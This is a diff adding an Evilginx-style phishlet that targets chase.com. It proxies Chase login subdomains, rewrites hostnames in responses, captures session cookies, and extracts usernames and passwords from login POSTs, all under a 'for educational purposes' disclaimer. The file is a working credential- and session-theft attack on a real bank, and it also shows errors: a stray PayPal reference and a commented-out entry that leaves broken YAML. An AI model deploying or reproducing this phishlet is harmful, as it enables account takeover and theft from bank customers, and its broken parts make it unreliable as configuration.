@@ -1,0 +1,59 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+# Email Params can be Triggered By using Below Command.
+# lures edit params ID email=test@email.com
+# Where ID is lure id number, and test@email.com is your known victim account email address for paypal. 
+
+author: 'YoungMoney01'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'secure', orig_sub: 'www', domain: 'chase.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'www', domain: 'chase.com', session: true, is_landing: true, auto_filter: true}
+# - {phish_sub: 'account', orig_sub: 'www', domain: 'chase.com', session: false, is_landing: false}
+# - {phish_sub: 'account', orig_sub: 'secure07c', domain: 'chase.com', session: false, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'secure', domain: 'chase.com', session: true, is_landing: true}
+  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'chase.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: 'secure05a', domain: 'chase.com', session: false, is_landing: false}
+  - {phish_sub: '', orig_sub: 'secure', domain: 'chase.com', session: false, is_landing: false}
+ 
+sub_filters:
+  - {triggers_on: 'secure07c.chase.com', orig_sub: 'secure', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure07c.chase.com', orig_sub: 'account', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+# - {triggers_on: 'secure.chase.com', orig_sub: '', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+# - {triggers_on: 'secure.chase.com', orig_sub: '', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure07c.chase.com', orig_sub: 'secure05a', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure.chase.com', orig_sub: 'secure05a', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure05a.chase.com', orig_sub: 'secure07c', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure05a.chase.com', orig_sub: 'secure07c', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure05a.chase.com', orig_sub: 'savings', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure05a.chase.com', orig_sub: 'savings', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'account.chase.com', orig_sub: 'secure', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'account.chase.com', orig_sub: 'secure', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'account.chase.com', orig_sub: 'account', domain: 'chase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'account.chase.com', orig_sub: 'account', domain: 'chase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.chase.com'
+    keys: ['.*,regexp','session']
+  - domain: '.chase.com'
+    keys: ['session','_visit','id']
+ # - domain: 'auth.chase.com'
+    keys: ['sid','ver,opt']
+auth_urls:
+  - '/myaccount/summary'
+  - '/myaccount/.*'     
+    
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.chase.com'
+  path: '/secure'
